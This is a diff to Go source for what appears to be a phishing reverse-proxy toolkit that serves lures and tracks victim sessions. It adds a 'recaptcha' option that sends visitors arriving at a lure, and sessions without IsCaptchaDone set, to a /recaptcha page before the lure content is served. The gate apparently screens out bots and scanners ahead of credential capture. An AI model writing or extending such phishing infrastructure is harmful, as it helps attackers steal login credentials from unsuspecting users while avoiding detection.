@@ -73,6 +73,7 @@ type HttpProxy struct {
     auto_filter_mimes []string
     ip_mtx            sync.Mutex
     livefeed		  bool
+    recaptcha         bool
 }
 
 type ProxySession struct {
@@ -82,7 +83,7 @@ type ProxySession struct {
     Index       int
 }
 
-func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool, livefeed bool) (*HttpProxy, error) {
+func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool, livefeed bool, recaptcha bool) (*HttpProxy, error) {
     p := &HttpProxy{
         Proxy:             goproxy.NewProxyHttpServer(),
         Server:            nil,
@@ -97,6 +98,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
         ip_sids:           make(map[string]string),
         auto_filter_mimes: []string{"text/html", "application/json", "application/javascript", "text/javascript", "application/x-javascript"},
         livefeed:          livefeed,
+        recaptcha:         recaptcha,
     }
     
     p.Server = &http.Server{
@@ -288,6 +290,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
                                     //p.whitelistIP(remote_addr, ps.SessionId)
 
                                     req_ok = true
+                                    if p.recaptcha {
+                                        return p.redirectCaptcha(req)
+                                    }
                                 }
                             } else {
                                 log.Warning("[%s] unauthorized request: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
@@ -336,6 +341,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
                 if ps.SessionId != "" {
                     if s, ok := p.sessions[ps.SessionId]; ok {
+                        if p.recaptcha {
+                            if !s.IsCaptchaDone {
+                                return p.redirectCaptcha(req)
+                            }
+                        }
                         l, err := p.cfg.GetLureByPath(pl_name, req_path)
                         if err == nil {
                             // show html template if it is set for the current lure
@@ -949,6 +959,16 @@ func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Respon
         if resp != nil {
             return req, resp
         }
+    }
+    return req, nil
+}
+
+func (p *HttpProxy) redirectCaptcha(req *http.Request) (*http.Request, *http.Response) {
+    resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
+    if resp != nil {
+        redirect_url := "http://" + req.Host + "/recaptcha"
+        resp.Header.Add("Location", redirect_url)
+        return req, resp
     }
     return req, nil
 }
@@ -1610,3 +1630,4 @@ func orPanic(err error) {
         panic(err)
     }
 }
+
